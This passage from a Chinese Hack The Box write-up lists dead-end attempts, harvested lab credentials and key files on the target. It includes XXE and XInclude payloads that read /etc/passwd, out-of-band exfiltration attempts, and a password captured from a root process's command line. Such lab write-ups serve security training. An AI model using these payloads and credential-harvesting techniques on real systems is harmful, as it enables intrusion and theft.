在拿到 shell 之前，试过 `svc-infra` / `svc_events` / `svc-events` / `svc_infra` / `svc-ingest` / `svc-aidx` 配合多个候选密码，全部失败，并且触发了 fail2ban——22 端口被 DROP，期间连 80 都不稳定，只能等冷却。

**教训：HTB 机器的用户密码几乎从不靠猜。** 每一次盲试都在制造噪音，而且会锁死后续正路。真正该做的是继续读文件找配置。

### A.5 在 8081 上打 XXE / XInclude / XSLT

这是耗时最多的死路。试过：

- 直接 XXE（`<!ENTITY ... SYSTEM "file:///etc/passwd">`）——被当作普通文本，没有回显；
- XInclude（`<xi:include href="file:///etc/passwd" parse="text"/>`）——无效果；
- XSLT（`<?xml-stylesheet?>` + 恶意样式表）——无效果；
- DTD 内联 / 参数实体——无效果。

**为什么无效**：ingest 是字符串匹配，不解析。用 CDATA 测试就能提前五分钟确认这一点（见 [2.4](#24-8081-端口)）。

**教训：在攻击一个 XML 端点之前，先花两分钟确定它到底解析不解析。**

### A.6 盲 XXE 的 OOB 尝试

在确认解析器存在之后，第一反应是做带外：

- 自建 HTTP 监听 + `<!ENTITY % file SYSTEM "file:///etc/passwd">` + 参数实体外带；
- `schemaLocation` 指向攻击机；
- webhook.site。

都没有成功。监听日志里能看到靶机发来的普通 GET（见 `evidence/http_listen.log`），但没有任何请求携带文件内容——参数实体拼 URL 这条路走不通。

**结论**：OOB 外带不可用，`file://` 实体读取正常。**转向**：既然带不出去，就用它自己的输出通道。解析器的输出本身就是通道——它把解析结果写回 Kafka，而 ClickHouse 能读 Kafka。

### A.7 34401 协议探测

见 [2.5](#25-34401-端口)。上面列出的协议逐一试过，全部 accept 后断开。浪费了大约半小时。

**教训：一个"open 但立即 close"的端口，在 HTB 上通常是"只允许本地"的提示，不是谜题。** 应该记录下来、继续往下走，等拿到 shell 再回头看。

### A.8 用 svc_events 写文件

在 ClickHouse 里试过 `INSERT INTO FUNCTION file(...)` 和 `CREATE TEMPORARY TABLE`，两者都返回 `Code: 497. DB::Exception: Access denied`。

`svc_events` 只有 `partner_feed.*` 的 SELECT / INSERT，没有 `READ ON FILE` / `WRITE ON FILE`，也没有 CREATE 权限（临时表同样被拒）。

**写文件的权限属于 `default`**，而 `default` 的密码要另外拿。

### A.9 /proc/1453/root 之后仍然读不到 user.txt

绕过 ProtectHome 之后，`/proc/1453/root/home/martin_cole` 仍然返回空。

起初以为是命名空间没生效，实际上返回的是"权限拒绝"——`/home/martin_cole` 是 `750`，`svc-infra` 不在这个组里。

**判断方法**：对比读一个确定存在且可读的文件（`/proc/1453/root/etc/passwd`）与目标文件的行为。前者有内容，后者让解析器直接抛错、不落行。这证明是权限问题而不是路径问题。

**结论**：命名空间绕过解决的是"看不到"，不是"没权限"。剩下的路只有提权。

### A.10 pgrep 抓不到 drainer

第一次用 `pgrep -a clickhouse-client`，跑了几个周期什么都没抓到。换成 `pgrep -af clickhouse-client` 后，在 drainer 的一次运行窗口里抓到了完整命令行：

```console
clickhouse-client --user default --password N3v3rs33nD4T4 -q INSERT INTO aidx_ops...
```

原因：`-a` 显示的是 `comm`，内核把进程名截断到 15 字符；`clickhouse-client` 是 17 个字符，`comm` 里是 `clickhouse-clie`，所以 `pgrep -a clickhouse-client` 的匹配本身就失败。

换成 `pgrep -af clickhouse-client`，`-f` 用完整命令行匹配，立刻命中。

**顺带一个细节**：即使用了 `-f`，也要在脚本里用 `-a` 打印完整命令行，否则只能看到 PID。真正的命令是 `pgrep -af`。

---

## 附录 B 凭据

| 账号 | 密码/凭据 | 获取位置 | 用途 |
|---|---|---|---|
| `svc_events` | `Yl4aCgh4y2PnU` | `/actuator/heapdump` → `DataSourceConfig` | H2 登录（未实际使用）+ ClickHouse 读写 |
| `svc-infra` | `Ny2hdpme$bwT3` | `/opt/kafka_2.13-4.3.1/config/server.properties` | SSH 登录 |
| `default` | `N3v3rs33nD4T4` | root drainer 运行时的 `pgrep -af clickhouse-client` | ClickHouse 全权限 + `file()` 写 |
| `svc_events` H2 哈希 | `SHA256(SHA256(UTF16BE("SVC_EVENTS@..."))) + salt d39d4251fea03bce` | heapdump `CREATE USER IF NOT EXISTS` | 算法验证用 |

---

## 附录 C 文件清单

| 路径 | 内容 |
|---|---|
| `/actuator/heapdump` | H2 凭据、jar 路径、应用类结构 |
| `/opt/aidx-pipeline/app/aidx_common.py` | XXE 配置（`resolve_entities=True`） |
| `/opt/aidx-pipeline/app/parser_worker.py` | 解析、投递 JSON、DLQ 逻辑 |
| `/opt/ops/dlq_drainer.py` | root 执行 formatter、调用 clickhouse-client |
| `/etc/systemd/system/aidx-dlq-drainer.{service,timer}` | root oneshot + 2 分钟定时器 |
| `/opt/kafka_2.13-4.3.1/config/server.properties` | SASL PLAIN 明文凭据 |
| `/var/lib/clickhouse/user_files/aidx_quarantine.py` | root 执行的 formatter（可被 ClickHouse 写入） |
| `/sys/fs/cgroup/system.slice/terminal-api.service/cgroup.procs` | 绕过 ProtectHome 用的 PID |
